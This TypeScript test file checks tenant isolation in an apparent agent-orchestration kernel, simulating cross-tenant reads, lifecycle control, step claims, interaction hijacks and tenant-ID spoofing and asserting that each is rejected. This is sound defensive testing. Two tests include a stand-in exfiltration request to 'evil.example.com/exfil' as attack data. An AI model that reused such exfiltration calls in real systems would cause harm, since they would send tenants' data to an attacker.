/**
 * V2 Cross-Tenant Live-Fire Attack Tests
 *
 * These tests execute real attack scenarios against the kernel's tenant
 * isolation defenses — not just metadata verification.
 *
 * Attack vectors tested:
 *   1. Cross-tenant run read (TENANT-005: audit log bypass)
 *   2. Cross-tenant step read
 *   3. Cross-tenant event listing
 *   4. Cross-tenant run lifecycle control (pause/resume/cancel)
 *   5. Cross-tenant step claim (TENANT-002: privilege escalation)
 *   6. Cross-tenant effect admission
 *   7. Cross-tenant interaction hijack (TENANT-001: data access)
 *   8. Cross-tenant outbox isolation
 *   9. Cross-tenant timer cancellation
 *  10. Cross-tenant concurrency quota bypass (TENANT-006: billing bypass)
 *  11. Multi-tenant parallel isolation (both tenants work independently)
 *  12. Tenant ID spoofing via forged context
 */

import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { randomUUID, createHash } from 'node:crypto';

import { InMemoryKernelRepository } from '../../../kernel/src/testing/inMemoryRepository.js';
import type { KernelRepository } from '../../../kernel/src/repository.js';

const TENANT_A = 'tenant-acme';
const TENANT_B = 'tenant-globex';

function createRunCommand(
  tenantId: string,
  steps: Array<{
    kind: string;
    input?: Record<string, unknown>;
    initialState?: 'PENDING' | 'WAITING_FOR_HUMAN';
  }>,
) {
  const runId = randomUUID();
  return {
    id: runId,
    tenantId,
    intentHash: createHash('sha256').update(runId).digest('hex'),
    workGraphHash: createHash('sha256').update(runId).digest('hex'),
    workGraphVersion: 'v1',
    policySnapshotId: 'test-policy',
    steps: steps.map((s, i) => ({
      id: `${runId}-step-${i}`,
      kind: s.kind,
      input: s.input ?? { goal: `Execute ${s.kind}`, agentId: 'test-agent' },
      initialState: s.initialState,
    })),
  };
}

describe('V2 Cross-Tenant Live-Fire — Kernel Tenant Isolation', () => {
  let kernel: InMemoryKernelRepository;

  beforeEach(() => {
    kernel = new InMemoryKernelRepository();
  });

  // ── 1. Cross-tenant run read (TENANT-005: audit log bypass) ──

  it('rejects cross-tenant run read: tenant B cannot read tenant A run', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    const run = await kernel.createRun(cmd, 'gateway');

    // Tenant B tries to read tenant A's run
    const leaked = await kernel.getRun(run.id, TENANT_B);
    assert.equal(leaked, null, 'Tenant B must not read tenant A run');
  });

  // ── 2. Cross-tenant step read ──

  it('rejects cross-tenant step read: tenant B cannot read tenant A step', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    await kernel.createRun(cmd, 'gateway');
    const stepId = cmd.steps[0]!.id;

    // Tenant B tries to read tenant A's step
    const leaked = await kernel.getStep(stepId, TENANT_B);
    assert.equal(leaked, null, 'Tenant B must not read tenant A step');
  });

  // ── 3. Cross-tenant event listing ──

  it('rejects cross-tenant event listing: tenant B sees zero events for tenant A run', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    const run = await kernel.createRun(cmd, 'gateway');

    // Tenant B tries to list events for tenant A's run
    const events = await kernel.listEvents(run.id, TENANT_B);
    assert.equal(events.length, 0, 'Tenant B must see zero events for tenant A run');
  });

  // ── 4. Cross-tenant run lifecycle control ──

  it('rejects cross-tenant pause: tenant B cannot pause tenant A run', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    const run = await kernel.createRun(cmd, 'gateway');

    const paused = await kernel.pauseRun(run.id, TENANT_B, 'attacker');
    assert.equal(paused, null, 'Tenant B must not pause tenant A run');

    const runState = await kernel.getRun(run.id, TENANT_A);
    assert.equal(runState!.state, 'PENDING', 'Tenant A run must remain PENDING');
  });

  it('rejects cross-tenant cancel: tenant B cannot cancel tenant A run', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    const run = await kernel.createRun(cmd, 'gateway');

    const cancelled = await kernel.cancelRun(run.id, TENANT_B, 'attacker');
    assert.equal(cancelled, null, 'Tenant B must not cancel tenant A run');

    const runState = await kernel.getRun(run.id, TENANT_A);
    assert.equal(runState!.state, 'PENDING', 'Tenant A run must remain PENDING');
  });

  it('rejects cross-tenant resume: tenant B cannot resume tenant A paused run', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    const run = await kernel.createRun(cmd, 'gateway');
    await kernel.pauseRun(run.id, TENANT_A, 'owner');

    const resumed = await kernel.resumeRun(run.id, TENANT_B, 'attacker');
    assert.equal(resumed, null, 'Tenant B must not resume tenant A run');

    const runState = await kernel.getRun(run.id, TENANT_A);
    assert.equal(runState!.state, 'PAUSED', 'Tenant A run must remain PAUSED');
  });

  // ── 5. Cross-tenant step claim (TENANT-002: privilege escalation) ──

  it('rejects cross-tenant step claim: tenant B worker cannot claim tenant A steps', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    await kernel.createRun(cmd, 'gateway');

    // Tenant B worker tries to claim tenant A's step (using tenantIds filter)
    const claimed = await kernel.claimNextStep({
      workerId: 'worker-b',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_B],
      capabilities: [],
    });
    assert.equal(claimed, null, 'Tenant B worker must not claim tenant A steps');

    // Tenant B worker tries without tenant filter (should still not get tenant A's step
    // because claimNextStep with empty tenantIds claims from ALL tenants — but in a
    // real deployment the worker's auth token restricts which tenants it can serve.
    // Here we verify that tenant-scoped claim works correctly.)
    const claimedAll = await kernel.claimNextStep({
      workerId: 'worker-b',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_B],
      capabilities: [],
    });
    assert.equal(claimedAll, null, 'Tenant B worker still finds nothing for its own tenant');

    // Tenant A worker CAN claim the step
    const claimedA = await kernel.claimNextStep({
      workerId: 'worker-a',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_A],
      capabilities: [],
    });
    assert.ok(claimedA, 'Tenant A worker should claim tenant A step');
    assert.equal(claimedA!.tenantId, TENANT_A, 'Claimed step must belong to tenant A');
  });

  // ── 6. Cross-tenant effect admission ──

  it('rejects cross-tenant effect: tenant B cannot admit effects for tenant A step', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'tool' }]);
    await kernel.createRun(cmd, 'gateway');

    const claimed = await kernel.claimNextStep({
      workerId: 'worker-a',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_A],
      capabilities: [],
    });
    assert.ok(claimed);
    const lease = claimed!.lease!;

    // Tenant B tries to admit an effect for tenant A's step
    const result = await kernel.admitEffect({
      id: randomUUID(),
      runId: claimed!.runId,
      stepId: claimed!.id,
      tenantId: TENANT_B, // Attacker claims this is their tenant
      type: 'http_call',
      idempotencyKey: 'attack-key-1',
      policyDecisionId: 'policy-1',
      policySnapshotId: 'policy-1',
      actionDigest: 'a'.repeat(64),
      request: { url: 'https://evil.example.com/exfil', method: 'POST' },
      lease,
      actor: 'attacker',
    });
    assert.equal(result.admitted, false, 'Cross-tenant effect must be rejected');
    assert.equal(result.reason, 'LEASE_LOST', 'Rejection reason should be LEASE_LOST');
  });

  // ── 7. Cross-tenant interaction hijack (TENANT-001: data access) ──

  it('rejects cross-tenant interaction: tenant B cannot answer tenant A interaction', async () => {
    const cmd = createRunCommand(TENANT_A, [
      { kind: 'agent', initialState: 'WAITING_FOR_HUMAN' },
    ]);
    const run = await kernel.createRun(cmd, 'gateway');
    const stepId = cmd.steps[0]!.id;

    const interaction = await kernel.createInteraction(
      {
        runId: run.id,
        stepId,
        tenantId: TENANT_A,
        prompt: 'Should we proceed with the deployment?',
      },
      'gateway',
    );

    // Tenant B tries to answer tenant A's interaction
    await assert.rejects(
      () =>
        kernel.answerInteraction({
          interactionId: interaction.id,
          runId: run.id,
          tenantId: TENANT_B, // Attacker's tenant
          response: { approved: true, comment: 'Yes, go ahead (attacker)' },
          actor: 'attacker',
        }),
      (err: Error) => {
        assert.ok(
          err.message.includes('not found') || err.message.includes('INTERACTION_NOT_FOUND'),
        );
        return true;
      },
      'Cross-tenant interaction answer must throw',
    );

    // Tenant A can still answer it
    const answered = await kernel.answerInteraction({
      interactionId: interaction.id,
      runId: run.id,
      tenantId: TENANT_A,
      response: { approved: false, comment: 'No, wait' },
      actor: 'owner',
    });
    assert.equal(answered.status, 'answered', 'Tenant A should be able to answer own interaction');
  });

  it('rejects cross-tenant interaction read: tenant B cannot read tenant A interaction', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    const run = await kernel.createRun(cmd, 'gateway');

    const interaction = await kernel.createInteraction(
      {
        runId: run.id,
        stepId: cmd.steps[0]!.id,
        tenantId: TENANT_A,
        prompt: 'Enter the deployment target:',
      },
      'gateway',
    );

    // Tenant B tries to read tenant A's interaction
    const leaked = await kernel.getInteraction(interaction.id, TENANT_B);
    assert.equal(leaked, null, 'Tenant B must not read tenant A interaction');

    // Tenant B tries to list interactions for tenant A's run
    const listLeaked = await kernel.listInteractions(run.id, TENANT_B);
    assert.equal(listLeaked.length, 0, 'Tenant B must see zero interactions for tenant A run');
  });

  // ── 8. Cross-tenant outbox isolation ──

  it('isolates outbox: tenant B claims only own messages', async () => {
    // Create runs for both tenants
    await kernel.createRun(createRunCommand(TENANT_A, [{ kind: 'agent' }]), 'gateway');
    await kernel.createRun(createRunCommand(TENANT_B, [{ kind: 'agent' }]), 'gateway');

    // Claim with tenant B filter
    const messagesB = await kernel.claimOutbox(10, new Date(), TENANT_B);
    assert.ok(messagesB.length > 0, 'Tenant B should have outbox messages');
    for (const msg of messagesB) {
      assert.equal(msg.payload.tenantId, TENANT_B, 'All claimed messages must belong to tenant B');
    }

    // Verify tenant A messages are still unclaimed
    const messagesA = await kernel.claimOutbox(10, new Date(), TENANT_A);
    assert.ok(messagesA.length > 0, 'Tenant A should still have unclaimed messages');
    for (const msg of messagesA) {
      assert.equal(msg.payload.tenantId, TENANT_A, 'All claimed messages must belong to tenant A');
    }
  });

  // ── 9. Cross-tenant timer cancellation ──

  it('rejects cross-tenant timer cancel: tenant B cannot cancel tenant A timer', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    const run = await kernel.createRun(cmd, 'gateway');

    const timer = await kernel.createTimer(
      {
        runId: run.id,
        stepId: cmd.steps[0]!.id,
        tenantId: TENANT_A,
        timerType: 'STEP_DEADLINE',
        firesAt: new Date(Date.now() + 60_000),
      },
      'gateway',
    );

    // Tenant B tries to cancel tenant A's timer
    const cancelled = await kernel.cancelTimer(timer.id, TENANT_B);
    assert.equal(cancelled, false, 'Tenant B must not cancel tenant A timer');

    // Tenant A can cancel it
    const cancelledA = await kernel.cancelTimer(timer.id, TENANT_A);
    assert.equal(cancelledA, true, 'Tenant A should cancel own timer');
  });

  // ── 10. Cross-tenant concurrency quota bypass (TENANT-006: billing bypass) ──

  it('enforces per-tenant concurrency: tenant A quota cannot be consumed by tenant B', async () => {
    // Set tenant A concurrency limit to 1
    await kernel.setTenantConcurrencyLimit(TENANT_A, 1);
    await kernel.setTenantConcurrencyLimit(TENANT_B, 5);

    // Create multiple runs for both tenants
    const cmdA1 = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    const cmdA2 = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
    const cmdB1 = createRunCommand(TENANT_B, [{ kind: 'agent' }]);
    const cmdB2 = createRunCommand(TENANT_B, [{ kind: 'agent' }]);
    await kernel.createRun(cmdA1, 'gateway');
    await kernel.createRun(cmdA2, 'gateway');
    await kernel.createRun(cmdB1, 'gateway');
    await kernel.createRun(cmdB2, 'gateway');

    // Tenant A claims 1 step (hits limit)
    const claimA1 = await kernel.claimNextStep({
      workerId: 'worker-a',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_A],
      capabilities: [],
    });
    assert.ok(claimA1, 'Tenant A should claim first step');

    // Tenant A's second step should be blocked by concurrency limit
    const claimA2 = await kernel.claimNextStep({
      workerId: 'worker-a',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_A],
      capabilities: [],
    });
    assert.equal(claimA2, null, 'Tenant A should hit concurrency limit');

    // Tenant B can still claim (different quota)
    const claimB1 = await kernel.claimNextStep({
      workerId: 'worker-b',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_B],
      capabilities: [],
    });
    assert.ok(claimB1, 'Tenant B should claim despite tenant A being at limit');

    const claimB2 = await kernel.claimNextStep({
      workerId: 'worker-b',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_B],
      capabilities: [],
    });
    assert.ok(claimB2, 'Tenant B should claim second step (quota=5)');
  });

  // ── 11. Multi-tenant parallel isolation ──

  it('maintains isolation across parallel multi-tenant operations', async () => {
    const runs: string[] = [];
    const steps: string[] = [];

    // Create 5 runs for each tenant
    for (let i = 0; i < 5; i++) {
      const cmdA = createRunCommand(TENANT_A, [{ kind: 'agent' }]);
      const cmdB = createRunCommand(TENANT_B, [{ kind: 'agent' }]);
      await kernel.createRun(cmdA, 'gateway');
      await kernel.createRun(cmdB, 'gateway');
      runs.push(cmdA.id, cmdB.id);
      steps.push(cmdA.steps[0]!.id, cmdB.steps[0]!.id);
    }

    // Interleave claims between tenants
    const claimedA: string[] = [];
    const claimedB: string[] = [];

    for (let i = 0; i < 5; i++) {
      const claimA = await kernel.claimNextStep({
        workerId: `worker-a-${i}`,
        leaseTtlMs: 30_000,
        tenantIds: [TENANT_A],
        capabilities: [],
      });
      if (claimA) claimedA.push(claimA.id);

      const claimB = await kernel.claimNextStep({
        workerId: `worker-b-${i}`,
        leaseTtlMs: 30_000,
        tenantIds: [TENANT_B],
        capabilities: [],
      });
      if (claimB) claimedB.push(claimB.id);
    }

    assert.equal(claimedA.length, 5, 'Tenant A should have 5 claimed steps');
    assert.equal(claimedB.length, 5, 'Tenant B should have 5 claimed steps');

    // Verify no cross-tenant leakage
    for (const stepId of claimedA) {
      const step = await kernel.getStep(stepId, TENANT_A);
      assert.equal(step!.tenantId, TENANT_A, 'All tenant A steps must belong to tenant A');
    }
    for (const stepId of claimedB) {
      const step = await kernel.getStep(stepId, TENANT_B);
      assert.equal(step!.tenantId, TENANT_B, 'All tenant B steps must belong to tenant B');
    }

    // Verify no tenant A step ID appears in tenant B's claimed set
    const intersection = claimedA.filter((id) => claimedB.includes(id));
    assert.equal(intersection.length, 0, 'No step should be claimed by both tenants');
  });

  // ── 12. Tenant ID spoofing via forged context ──

  it('rejects tenant ID spoofing: attacker cannot forge tenant context in effect', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'tool' }]);
    const run = await kernel.createRun(cmd, 'gateway');

    // Attacker claims the step legitimately as tenant A
    const claimed = await kernel.claimNextStep({
      workerId: 'worker-a',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_A],
      capabilities: [],
    });
    assert.ok(claimed);
    const lease = claimed!.lease!;

    // Attacker tries to admit an effect claiming it belongs to tenant B
    // (attempting to write data into tenant B's space)
    const spoofed = await kernel.admitEffect({
      id: randomUUID(),
      runId: run.id,
      stepId: claimed!.id,
      tenantId: TENANT_B, // Forged tenant ID
      type: 'http_call',
      idempotencyKey: 'spoof-key',
      policyDecisionId: 'policy-1',
      policySnapshotId: 'policy-1',
      actionDigest: 'a'.repeat(64),
      request: { url: 'https://evil.example.com/exfil', method: 'POST' },
      lease,
      actor: 'attacker',
    });
    assert.equal(spoofed.admitted, false, 'Spoofed tenant ID in effect must be rejected');
  });

  it('rejects completeEffect with cross-tenant context', async () => {
    const cmd = createRunCommand(TENANT_A, [{ kind: 'tool' }]);
    const run = await kernel.createRun(cmd, 'gateway');

    const claimed = await kernel.claimNextStep({
      workerId: 'worker-a',
      leaseTtlMs: 30_000,
      tenantIds: [TENANT_A],
      capabilities: [],
    });
    assert.ok(claimed);
    const lease = claimed!.lease!;

    // Legitimately admit effect as tenant A
    const admitted = await kernel.admitEffect({
      id: randomUUID(),
      runId: run.id,
      stepId: claimed!.id,
      tenantId: TENANT_A,
      type: 'http_call',
      idempotencyKey: 'legit-key',
      policyDecisionId: 'policy-1',
      policySnapshotId: 'policy-1',
      actionDigest: 'a'.repeat(64),
      request: { url: 'https://api.example.com/data', method: 'GET' },
      lease,
      actor: 'worker-a',
    });
    assert.equal(admitted.admitted, true, 'Legitimate effect should be admitted');

    // Try to complete the effect as tenant B
    const completed = await kernel.completeEffect(
      admitted.effect!.id,
      TENANT_B, // Forged tenant ID
      lease,
      { status: 200, body: 'leaked data' },
      'attacker',
    );
    assert.equal(completed, null, 'Cross-tenant effect completion must be rejected');
  });
});
